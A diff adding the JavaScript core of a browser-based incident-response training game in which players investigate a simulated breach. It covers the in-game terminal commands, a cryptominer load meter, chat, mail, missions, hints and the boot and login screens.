+      const r = lookup(ctx.sess, norm(ctx.sess, m[2]), ctx.sudo);
+      if (!r.node || r.node.t !== 'f') { ctx.out(`${m[2]}: FAILED open or read`); bad++; continue; }
+      lineReads.push({ host: ctx.sess.host, abs: norm(ctx.sess, m[2]) });
+      const ok = fn(r.node.s) === m[1]; if (!ok) bad++;
+      ctx.out(`${m[2]}: ${ok ? (ctx.tty ? C(32, 'OK') : 'OK') : (ctx.tty ? C('1;31', 'FAILED') : 'FAILED')}`);
+    }
+    if (bad) ctx.err(`${name}: WARNING: ${bad} computed checksum${bad > 1 ? 's' : ''} did NOT match`);
+    lineCmds.push({ name, args: ['-c'], host: ctx.sess.host });
+    return bad ? 1 : 0;
+  }
+  const ins = getInput(ctx, rest, name); if (!ins) return 1;
+  ctx.out(ins.map(x => `${fn(x.s)}  ${x.name}`).join('\n') + '\n');
+}
+function touchMk(args, ctx, type) {
+  const { flags, rest } = parseOpts(args);
+  if (!rest.length) { ctx.err(`${type === 'd' ? 'mkdir' : 'touch'}: missing operand`); return 1; }
+  for (const f of rest) {
+    const abs = norm(ctx.sess, f), [dir, name] = splitPath(abs), pr = lookup(ctx.sess, dir, ctx.sudo);
+    if (!pr.node || pr.node.t !== 'd') { ctx.err(`${type === 'd' ? 'mkdir' : 'touch'}: cannot create '${f}': No such file or directory`); return 1; }
+    if (!canWrite(ctx.sess, pr.node, ctx.sudo) || (ctx.sess.host === 'nullbox' && abs.startsWith(ctx.sess.home + '/cases'))) { ctx.err(`${type === 'd' ? 'mkdir' : 'touch'}: cannot create '${f}': Permission denied`); return 1; }
+    if (pr.node.c[name]) { if (type === 'd' && !flags.has('p')) { ctx.err(`mkdir: cannot create directory '${f}': File exists`); return 1; } continue; }
+    pr.node.c[name] = type === 'd' ? { t: 'd', c: {}, own: 'user', mode: '755' } : { t: 'f', s: '', own: 'user', mode: '644' };
+  }
+}
+
+/* ============ server-load meter (chapter 6) ============ */
+let meter = 35;
+function meterActive() { const m = MISSIONS[S.mi]; return !!(m && m.meter && cur().host === 'lumen-web' && !LW().killed); }
+function updateMeter() {
+  const on = meterActive();
+  $('meter').classList.toggle('hidden', !on);
+  $('meterf').style.width = meter + '%'; $('meterp').textContent = Math.round(meter) + '%';
+}
+function tickMeter() {
+  if (!meterActive()) return;
+  meter = Math.min(100, meter + 6);
+  if (meter >= 100) {
+    SND.alarm();
+    tprint(C('1;31', '\n*** lumen-web: CPU at 100% · website not responding ***'));
+    ghost("🔥 Lumen's website just went down! Their CEO is calling Maya... Quick: `sudo kill " + MINER_PID + "` stops the miner. (Load reset; you've got this.)");
+    meter = 45;
+  } else if (meter >= 80) SND.alarm();
+  updateMeter();
+}
+
+/* ============ windows ============ */
+const WINS = {
+  term: { el: 'w-term', icon: '⌨️', name: 'Terminal' }, chat: { el: 'w-chat', icon: '👻', name: 'Ghost' }, missions: { el: 'w-missions', icon: '🎯', name: 'Missions' },
+  mail: { el: 'w-mail', icon: '✉️', name: 'Mail' }, notes: { el: 'w-notes', icon: '📘', name: 'Notes' }, settings: { el: 'w-settings', icon: '⚙️', name: 'Settings' },
+};
+let zTop = 20;
+const isMobile = () => window.innerWidth <= 760;
+function layout() {
+  const W = window.innerWidth, H = window.innerHeight, top = 50, bottom = 80, left = 110;
+  const avail = W - left - 20, termW = Math.min(820, Math.round(avail * 0.62)), chatW = Math.max(300, Math.min(420, avail - termW - 14));
+  const h = H - top - bottom;
+  const set = (id, x, y, w, hh) => { const e = $(id); e.style.left = x + 'px'; e.style.top = y + 'px'; e.style.width = w + 'px'; e.style.height = hh + 'px'; };
+  set('w-term', left, top, termW, h);
+  set('w-chat', left + termW + 14, top, chatW, Math.round(h * 0.62));
+  set('w-missions', left + termW + 14, top + Math.round(h * 0.62) + 12, chatW, h - Math.round(h * 0.62) - 12);
+  set('w-mail', left + 60, top + 30, Math.min(720, W - left - 80), Math.min(480, h - 30));
+  set('w-notes', left + 90, top + 20, Math.min(560, W - left - 110), Math.min(560, h - 20));
+  set('w-settings', left + 140, top + 50, Math.min(440, W - left - 160), Math.min(470, h - 50));
+}
+function openWin(k) {
+  const e = $(WINS[k].el); e.classList.remove('hidden');
+  if (isMobile()) for (const o in WINS) if (o !== k) $(WINS[o].el).classList.add('hidden');
+  focusWin(e); renderDock();
+  if (k === 'term') setTimeout(() => tin.focus(), 0);
+  if (k === 'mail') renderMail(); if (k === 'notes') renderNotes(); if (k === 'missions') renderMissions();
+  if (k === 'chat') { clearBadge('chat'); const b = $('chat').parentElement; b.scrollTop = b.scrollHeight; }
+}
+function closeWin(e) { e.classList.add('hidden'); renderDock(); }
+function focusWin(e) { document.querySelectorAll('.win').forEach(w => w.classList.remove('focus')); e.classList.add('focus'); e.style.zIndex = ++zTop; }
+document.querySelectorAll('.win').forEach(w => {
+  w.addEventListener('pointerdown', () => focusWin(w));
+  w.querySelectorAll('.dots i').forEach(d => d.addEventListener('click', ev => { ev.stopPropagation(); if (d.dataset.a === 'max') w.classList.toggle('max'); else closeWin(w); }));
+  const bar = w.querySelector('.bar'), rs = w.querySelector('.rs');
+  bar.addEventListener('dblclick', () => w.classList.toggle('max'));
+  const drag = (handle, onMove) => handle.addEventListener('pointerdown', ev => {
+    if (isMobile() || ev.target.tagName === 'I' || w.classList.contains('max')) return;
+    ev.preventDefault(); handle.setPointerCapture(ev.pointerId);
+    const sx = ev.clientX, sy = ev.clientY, r = { x: w.offsetLeft, y: w.offsetTop, w: w.offsetWidth, h: w.offsetHeight };
+    const mv = e => onMove(e.clientX - sx, e.clientY - sy, r);
+    const up = () => { handle.removeEventListener('pointermove', mv); handle.removeEventListener('pointerup', up); };
+    handle.addEventListener('pointermove', mv); handle.addEventListener('pointerup', up);
+  });
+  drag(bar, (dx, dy, r) => { w.style.left = Math.max(-r.w + 80, Math.min(window.innerWidth - 80, r.x + dx)) + 'px'; w.style.top = Math.max(38, Math.min(window.innerHeight - 60, r.y + dy)) + 'px'; });
+  drag(rs, (dx, dy, r) => { w.style.width = Math.max(280, r.w + dx) + 'px'; w.style.height = Math.max(180, r.h + dy) + 'px'; });
+});
+const badges = { chat: 0, mail: 0 };
+function setBadge(k, n) { badges[k] = n; renderDock(); }
+function clearBadge(k) { setBadge(k, 0); }
+function renderDock() {
+  const mk = (k, cls) => { const b = badges[k] ? `<span class="badge">${badges[k]}</span>` : ''; const open = !$(WINS[k].el).classList.contains('hidden'); return `<button class="${cls}${open && cls !== 'dicon' ? ' open' : ''}" data-w="${k}" title="${WINS[k].name}">${cls === 'dicon' ? `<span class="ic">${WINS[k].icon}</span>${WINS[k].name}` : WINS[k].icon}${b}</button>`; };
+  $('dock').innerHTML = Object.keys(WINS).map(k => mk(k, '')).join('');
+  $('icons').innerHTML = Object.keys(WINS).map(k => mk(k, 'dicon')).join('');
+  document.querySelectorAll('[data-w]').forEach(b => b.onclick = () => { au(); const e = $(WINS[b.dataset.w].el); if (!e.classList.contains('hidden') && e.classList.contains('focus') && !isMobile()) closeWin(e); else openWin(b.dataset.w); });
+}
+
+/* ============ toasts ============ */
+function toast(html, cls = '') { const t = document.createElement('div'); t.className = 'toast ' + cls; t.innerHTML = html; $('toasts').appendChild(t); setTimeout(() => t.remove(), 3800); }
+
+/* ============ ghost chat ============ */
+const chatBox = $('chat');
+let ghostQ = Promise.resolve();
+function addMsg(who, text, cls, store = true) {
+  const d = document.createElement('div'); d.className = 'msg ' + (cls || '');
+  d.innerHTML = cls === 'sys' ? md(text) : `<div class="who">${esc(who)}</div>${md(text)}`;
+  chatBox.appendChild(d); const b = chatBox.parentElement; b.scrollTop = b.scrollHeight;
+  if (store) { S.chat.push([who, text, cls || '']); if (S.chat.length > 160) S.chat.splice(0, S.chat.length - 160); save(); }
+}
+function ghost(text) {
+  ghostQ = ghostQ.then(async () => {
+    const ty = document.createElement('div'); ty.className = 'typing'; ty.textContent = 'Ghost is typing…'; chatBox.appendChild(ty);
+    const b = chatBox.parentElement; b.scrollTop = b.scrollHeight;
+    await sleep(Math.min(1400, 350 + fmt(text).length * 9)); ty.remove();
+    addMsg('GHOST', text); SND.msg();
+    if ($('w-chat').classList.contains('hidden')) setBadge('chat', badges.chat + 1);
+  });
+  return ghostQ;
+}
+const ghostOnceSet = new Set();
+function ghostOnce(key, text) { if (ghostOnceSet.has(key)) return; ghostOnceSet.add(key); ghost(text); }
+function sys(text) { addMsg('', text, 'sys'); }
+
+/* ============ mail ============ */
+let mailSel = null;
+function deliverMail(id, m) {
+  if (S.mails.find(x => x.id === id)) return;
+  S.mails.unshift({ id, from: m.from, subj: m.subj, body: m.body, time: new Date().toTimeString().slice(0, 5) }); save();
+  SND.mail(); toast(`✉️ <b>New mail</b> from ${esc(m.from)}<br>${esc(m.subj)}`); updateMailBadge(); renderMail();
+}
+function updateMailBadge() { setBadge('mail', S.mails.filter(m => !S.readMail.includes(m.id)).length); }
+function renderMail() {
+  $('mlist').innerHTML = S.mails.length ? S.mails.map(m => `<div class="mi ${S.readMail.includes(m.id) ? '' : 'unread'} ${mailSel === m.id ? 'on' : ''}" data-id="${m.id}"><b>${esc(m.from)}</b><span>${esc(m.subj)}</span></div>`).join('') : '<div class="empty">No mail yet.</div>';
+  $('mlist').querySelectorAll('.mi').forEach(e => e.onclick = () => { mailSel = e.dataset.id; if (!S.readMail.includes(mailSel)) { S.readMail.push(mailSel); save(); } updateMailBadge(); renderMail(); });
+  const m = S.mails.find(x => x.id === mailSel);
+  $('mview').innerHTML = m ? `<h3>${esc(m.subj)}</h3><div class="meta">From: ${esc(m.from)} · ${m.time}</div>${md(m.body)}` : '<div class="empty">Pick a message.</div>';
+}
+
+/* ============ notes & cards ============ */
+function renderNotes() {
+  $('notes').innerHTML = S.learned.length ? '<p style="color:var(--muted);font-size:12px;margin:0 0 12px">Every command you learn is saved here. Click one to open its card.</p>' + S.learned.map(k => CARDS[k] ? `<div class="note" data-k="${k}"><h4>${esc(CARDS[k].cmd)}</h4><p>${fmt(CARDS[k].what)}</p></div>` : '').join('') : '<div class="empty">Nothing here yet. Commands you learn will be saved here as a cheat sheet.</div>';
+  $('notes').querySelectorAll('.note').forEach(n => n.onclick = () => showCard(n.dataset.k, false));
+}
+let cardQueue = [], cardOpen = false;
+function showCard(k, isNew = true) {
+  if (cardOpen) { cardQueue.push([k, isNew]); return; }
+  const c = CARDS[k]; if (!c) return;
+  cardOpen = true;
+  $('cardbox').innerHTML = `<div class="tag">${isNew ? '📘 NEW COMMAND LEARNED · REAL WORLD' : '📘 REAL WORLD'}</div><h2>${esc(c.cmd)}</h2><p class="what"><b>${esc(c.title)}.</b> ${fmt(c.what)}</p><div class="real">${fmt(c.real)}</div><pre>${esc(fmt(c.ex)).split('\n').map(l => '$ ' + l).join('\n')}</pre><button class="go" id="cardOk">GOT IT ↵</button>`;
+  $('card').classList.remove('hidden');
+  const close = () => { $('card').classList.add('hidden'); cardOpen = false; document.removeEventListener('keydown', kd, true); if (cardQueue.length) { const [a, b] = cardQueue.shift(); showCard(a, b); } else tin.focus(); };
+  const kd = e => { if (e.key === 'Enter' || e.key === 'Escape') { e.preventDefault(); e.stopPropagation(); close(); } };
+  $('cardOk').onclick = close;
+  setTimeout(() => document.addEventListener('keydown', kd, true), 150);
+}
+function learn(k) {
+  if (!S.learned.includes(k)) { S.learned.push(k); save(); setTimeout(() => showCard(k, true), 900); }
+}
+
+/* ============ progression ============ */
+function addXP(n) {
+  const before = rankOf(S.xp)[1];
+  S.xp = Math.max(0, S.xp + n); save(); renderXP();
+  const after = rankOf(S.xp)[1];
+  if (after !== before && n > 0) { toast(`🏅 <b>Promoted!</b> You are now: <b>${after}</b>`, 'ok'); setTimeout(() => sys(`🏅 PROMOTED TO **${after.toUpperCase()}**`), 600); }
+}
+function renderXP() {
+  const r = rankOf(S.xp), i = RANKS.indexOf(r), nx = RANKS[i + 1];
+  $('rank').textContent = r[1]; $('xptxt').textContent = S.xp + ' XP';
+  $('xpfill').style.width = (nx ? (S.xp - r[0]) / (nx[0] - r[0]) * 100 : 100) + '%';
+}
+function curObj() { const m = MISSIONS[S.mi]; return m && m.objs[S.oi]; }
+function startMission(i, resume) {
+  S.mi = i; S.oi = resume ? S.oi : 0; save();
+  const m = MISSIONS[i];
+  if (!m) return;
+  if (!resume) {
+    if (i === 0 || MISSIONS[i - 1].ch !== m.ch) sys(`━━━ CHAPTER ${chapterNum(i)}: ${m.ch} ━━━`);
+    sys(`🎯 MISSION: **${m.title}**`);
+    if (m.mail) deliverMail('m' + i, m.mail);
+    for (const t of m.intro || []) ghost(t);
+    if (m.meter) meter = 35;
+  }
+  announce();
+  renderMissions(); updateMeter();
+}
+function chapterNum(i) { const chs = []; for (const m of MISSIONS) if (!chs.includes(m.ch)) chs.push(m.ch); return chs.indexOf(MISSIONS[i].ch) + 1; }
+function announce() {
+  const o = curObj(); if (!o) return;
+  if (o.say) ghost(o.say); else ghost(`Next: **${o.t}**`);
+}
+function progress(ev) {
+  const o = curObj(); if (!o || S.done) return false;
+  let ok = false; try { ok = o.check(ev); } catch (e) { console.error(e); }
+  if (!ok) return false;
+  SND.ok(); addXP(10);
+  toast(`✅ ${esc(o.t)}`, 'ok');
+  if (o.learn) learn(o.learn);
+  if (o.done) ghost(o.done);
+  S.oi++; save();
+  const m = MISSIONS[S.mi];
+  if (S.oi >= m.objs.length) {
+    setTimeout(() => { SND.mission(); }, 300);
+    addXP(m.xp);
+    toast(`🏆 <b>Mission complete:</b> ${esc(m.title)} (+${m.xp} XP)`, 'ok');
+    if (m.outro) ghost(m.outro);
+    if (S.mi + 1 < MISSIONS.length) ghostQ.then(() => sleep(900)).then(() => startMission(S.mi + 1));
+    else { S.done = true; S.mi = MISSIONS.length; save(); ghostQ.then(() => sleep(1200)).then(endGame); }
+  } else announce();
+  renderMissions(); updateMeter();
+  if (S.oi < (MISSIONS[S.mi] || { objs: [] }).objs.length) setTimeout(() => progress({ type: 'state' }), 50);
+  return true;
+}
+let wrongCount = 0;
+function submitAnswer(v) {
+  const o = curObj();
+  addMsg(S.handle.toUpperCase(), 'submit: ' + v, 'me');
+  if (!o || !o.check.sub) { tprint(C(33, "Nothing to submit right now. Ghost will tell you when there's a question to answer.")); return; }
+  if (progress({ type: 'submit', value: v })) { tprint(C('1;32', '✔ Correct!')); wrongCount = 0; }
+  else { SND.bad(); wrongCount++; tprint(C('1;31', '✘ Not quite. Try again.') + (wrongCount >= 2 ? C(90, '  (stuck? type: hint)') : '')); if (wrongCount === 3) ghost("Not quite. Need a hand? Type `hint`, or tap 💡 hint under the terminal."); }
+}
+function showHint() {
+  const o = curObj(); if (!o) { tprint(C(90, 'No active objective.')); return; }
+  const key = S.mi + ':' + S.oi, step = S.hintStep[key] || 0, hs = (o.hints || []).filter(Boolean);
+  if (!hs.length) { tprint(C(33, '💡 ' + o.t)); return; }
+  const h = hs[Math.min(step, hs.length - 1)];
+  if (step < hs.length) { S.hintStep[key] = step + 1; if (step > 0) addXP(-5); save(); }
+  tprint(C(33, '💡 Hint: ') + strip(fmt(h)).replace(/`/g, '') + (step === 0 && hs.length > 1 ? C(90, '   (type hint again for the exact answer, costs 5 XP)') : ''));
+  renderMissions();
+}
+function renderMissions() {
+  let html = '', lastCh = null;
+  MISSIONS.forEach((m, i) => {
+    if (m.ch !== lastCh) { html += `<div class="chap">CHAPTER ${chapterNum(i)} · ${esc(m.ch)}</div>`; lastCh = m.ch; }
+    const st = i < S.mi ? 'done' : i === S.mi ? 'cur' : 'lock';
+    html += `<div class="mrow ${st}"><span class="st">${st === 'done' ? '✅' : st === 'cur' ? '▶' : '🔒'}</span><span>${esc(m.title)}</span><small>${m.xp} XP</small></div>`;
+    if (st === 'cur') {
+      html += '<ul class="objs">' + m.objs.map((o, j) => `<li class="${j < S.oi ? 'done' : j === S.oi ? 'now' : ''}">${j < S.oi ? '✔' : j === S.oi ? '➜' : '○'} ${esc(fmt(o.t))}</li>`).join('') + '</ul>';
+      html += '<button class="hintbtn" id="hintBtn">💡 Hint</button>';
+    }
+  });
+  if (S.done) html += `<div class="chap" style="color:var(--ok)">ALL CASES CLOSED 🏆</div><p style="font-size:13px;color:var(--muted)">More chapters are coming. Free play: keep exploring both machines!</p>`;
+  $('missions').innerHTML = html;
+  const hb = $('hintBtn'); if (hb) hb.onclick = () => { openWin('term'); showHint(); };
+}
+async function endGame() {
+  while (cardOpen || cardQueue.length) await sleep(400);
+  sys('━━━ CASE CLOSED ━━━');
+  $('cardbox').innerHTML = `<div class="tag">🏆 ALL MISSIONS COMPLETE</div><h2 class="glitch">CASE CLOSED</h2><p class="what">${esc(S.handle)}, you investigated a real-style breach from first clue to final report.</p>
+  <div class="real">Rank: <b>${rankOf(S.xp)[1]}</b><br>XP: <b>${S.xp}</b><br>Commands learned: <b>${S.learned.length}</b><br><br>These are the same skills used every day by <b>SOC analysts</b>, <b>incident responders</b> and <b>Linux admins</b>. Next steps in real life: try <b>TryHackMe</b> or <b>OverTheWire: Bandit</b> to keep practising legally.</div>
+  <button class="go" id="endOk">KEEP EXPLORING</button>`;
+  $('card').classList.remove('hidden'); cardOpen = true;
+  $('endOk').onclick = () => { $('card').classList.add('hidden'); cardOpen = false; tin.focus(); };
+  renderMissions();
+}
+
+/* ============ terminal input ============ */
+function tabComplete() {
+  const v = tin.value, sp = v.lastIndexOf(' ') + 1, word = v.slice(sp), first = !v.slice(0, sp).trim() || /[|;&]\s*$/.test(v.slice(0, sp));
+  let cands;
+  if (first && !word.includes('/')) cands = TAB_CMDS.filter(c => c.startsWith(word));
+  else {
+    const s = cur(), slash = word.lastIndexOf('/'), dir = slash >= 0 ? word.slice(0, slash + 1) : '', base = word.slice(slash + 1);
+    const r = lookup(s, norm(s, (dir || '.').replace(/^~(?=\/|$)/, s.home)), false);
+    if (!r.node || r.node.t !== 'd') return;
+    cands = Object.keys(r.node.c).filter(n => n.startsWith(base) && (base.startsWith('.') || !n.startsWith('.'))).sort().map(n => dir + n + (r.node.c[n].t === 'd' ? '/' : ''));
+  }
+  if (!cands.length) return;
+  if (cands.length === 1) { tin.value = v.slice(0, sp) + cands[0] + (cands[0].endsWith('/') ? '' : ' '); return; }
+  let pre = cands[0]; for (const c of cands) while (!c.startsWith(pre)) pre = pre.slice(0, -1);
+  if (pre.length > word.length) tin.value = v.slice(0, sp) + pre;
+  else { tprintEcho(); tprint(cands.map(c => c.split('/').filter(Boolean).pop() + (c.endsWith('/') ? '/' : '')).join('  ')); }
+}
+function tprintEcho(text = tin.value) { const d = document.createElement('div'); d.innerHTML = ansi(promptStr()) + esc(text); tout.appendChild(d); }
+async function submitLine() {
+  const line = tin.value;
+  if (pwResolve) { const r = pwResolve; pwResolve = null; tin.value = ''; tin.classList.remove('pw'); tprint(''); r(line); return; }
+  if (busy) return;
+  tprintEcho(line); tin.value = '';
+  if (line.trim()) { if (hist[hist.length - 1] !== line) hist.push(line); }
+  hidx = hist.length;
+  if (!line.trim()) { twrap.scrollTop = twrap.scrollHeight; return; }
+  busy = true; abortFlag = false; $('termline').style.visibility = 'hidden';
+  const hostBefore = cur().host;
+  await runLine(line);
+  busy = false; abortFlag = false; $('termline').style.visibility = '';
+  const ev = { type: 'line', line, cmds: lineCmds.slice(), reads: lineReads.slice(), host: cur().host, cwd: cur().cwd, out: strip(lineOut) };
+  if (hostBefore === 'lumen-web' || cur().host === 'lumen-web') tickMeter();
+  progress(ev);
+  renderPrompt(); twrap.scrollTop = twrap.scrollHeight; tin.focus();
+}
+tin.addEventListener('keydown', e => {
+  if (e.key === 'Enter') { e.preventDefault(); submitLine(); }
+  else if (e.key === 'Tab') { e.preventDefault(); tabComplete(); }
+  else if (e.key === 'ArrowUp') { e.preventDefault(); if (hidx > 0) { hidx--; tin.value = hist[hidx]; } }
+  else if (e.key === 'ArrowDown') { e.preventDefault(); if (hidx < hist.length - 1) { hidx++; tin.value = hist[hidx]; } else { hidx = hist.length; tin.value = ''; } }
+  else if (e.key === 'l' && e.ctrlKey) { e.preventDefault(); tout.innerHTML = ''; }
+  else if (e.key === 'c' && e.ctrlKey && tin.selectionStart === tin.selectionEnd) { ctrlC(); e.preventDefault(); }
+});
+document.addEventListener('keydown', e => { if (busy && e.key === 'c' && e.ctrlKey) { e.preventDefault(); ctrlC(); } });
+function ctrlC() { if (busy) { abortFlag = true; return; } tprintEcho(tin.value + '^C'); tin.value = ''; }
+twrap.addEventListener('click', () => { if (!window.getSelection().toString()) tin.focus(); });
+$('termtools').addEventListener('click', e => {
+  const k = e.target.dataset && e.target.dataset.k; if (!k) return;
+  if (k === 'tab') tabComplete(); else if (k === 'up') { if (hidx > 0) { hidx--; tin.value = hist[hidx]; } } else if (k === 'ctrlc') ctrlC(); else if (k === 'clear') tout.innerHTML = ''; else if (k === 'hint') showHint();
+  tin.focus();
+});
+
+/* ============ settings ============ */
+function applyTheme() { document.documentElement.dataset.theme = S.theme; $('themes').innerHTML = [['cyber', 'Cyberpunk'], ['matrix', 'Matrix'], ['amber', 'Retro amber']].map(([k, n]) => `<button class="opt ${S.theme === k ? 'on' : ''}" data-t="${k}">${n}</button>`).join(''); $('themes').querySelectorAll('button').forEach(b => b.onclick = () => { S.theme = b.dataset.t; save(); applyTheme(); }); }
+function applySound() { $('sndBtn').textContent = S.sound ? '🔊' : '🔇'; $('sndOpt').textContent = 'Sound: ' + (S.sound ? 'on' : 'off'); }
+$('sndBtn').onclick = $('sndOpt').onclick = () => { S.sound = !S.sound; save(); applySound(); };
+$('resetBtn').onclick = () => { if (confirm('Delete all progress and start again from the beginning?')) { localStorage.removeItem(SAVE_KEY); location.reload(); } };
+setInterval(() => { $('clock').textContent = new Date().toTimeString().slice(0, 5); }, 1000);
+
+/* ============ boot & login ============ */
+async function boot() {
+  const b = $('boot'); b.classList.remove('hidden');
+  const L = ['NullBox BIOS v1.0  (c) NULLSEC', 'CPU: 8 cores OK   RAM: 16384 MB OK', '', '[ <span class="ok">OK</span> ] Mounted /home', '[ <span class="ok">OK</span> ] Started Network Manager', '[ <span class="ok">OK</span> ] Connected to nullsec-office (192.168.1.42)', '[ <span class="ok">OK</span> ] Started encrypted team chat', '[ <span class="ok">OK</span> ] Loaded incident response toolkit', '', 'nullbox login: _'];
+  let skip = false; const sk = () => skip = true; window.addEventListener('keydown', sk); b.addEventListener('pointerdown', sk);
+  for (const l of L) { if (!skip) await sleep(140 + Math.random() * 120); b.innerHTML += l + '\n'; }
+  if (!skip) await sleep(400);
+  window.removeEventListener('keydown', sk);
+  b.classList.add('hidden');
+}
+function login() {
+  return new Promise(res => {
+    $('login').classList.remove('hidden');
+    const inp = $('handle'); setTimeout(() => inp.focus(), 50);
+    const go = () => {
+      const h = inp.value.trim().replace(/[<>]/g, '').slice(0, 16);
+      if (!h) { inp.focus(); inp.style.borderColor = 'var(--bad)'; return; }
+      au();
+      S.handle = h; S.user = h.toLowerCase().replace(/[^a-z0-9_]/g, '').slice(0, 16) || 'analyst2';
+      if (S.user === 'analyst' || S.user === 'root' || /^\d/.test(S.user)) S.user = 'u' + S.user;
+      save(); $('login').classList.add('hidden'); res();
+    };
+    $('loginBtn').onclick = go; inp.onkeydown = e => { if (e.key === 'Enter') go(); };
+  });
+}
+async function main() {
+  applyTheme(); applySound();
+  const fresh = !S.handle;
+  await boot();
+  if (fresh) await login();
+  LAPTOP = buildLaptop(S.user, S.handle);
+  sessions.push({ host: 'nullbox', user: S.user, fs: LAPTOP, home: '/home/' + S.user, cwd: '/home/' + S.user, prev: null });
+  $('desktop').classList.remove('hidden');
+  layout(); renderDock(); renderXP(); renderPrompt();
+  for (const [w, t, c] of S.chat) addMsg(w, t, c, false);
+  updateMailBadge();
+  if (!isMobile()) { openWin('missions'); openWin('chat'); }
+  openWin('term');
+  tprint(`${C('1;35', 'NULLSEC OS')} ${C(90, '· type')} ${C(36, 'help')} ${C(90, 'for commands ·')} ${C(36, 'hint')} ${C(90, 'if you get stuck')}\nLast login: ${new Date().toDateString()} on pts/0`);
+  if (fresh || !S.chat.length) startMission(0);
+  else if (S.done) { renderMissions(); sys('Welcome back! All cases are closed. Free play mode.'); }
+  else { sys('— session restored —'); ghost(`Welcome back, {h}. We're on **${MISSIONS[S.mi].title}**.`); announce(); renderMissions(); }
+  if (isMobile()) ghostOnce('mobile', "📱 On a phone? Use the dock at the bottom to switch between the terminal and this chat.");
+}
+window.addEventListener('resize', () => { if (!isMobile()) layout(); });
+window.__hos = { run: async l => { tin.value = l; await submitLine(); }, S: () => S, md5, sha256, FAIL: () => [FAIL_TOTAL, FAIL_ATTACKER], cur };
+main();
+})();
+</script>
+</body>
+</html>
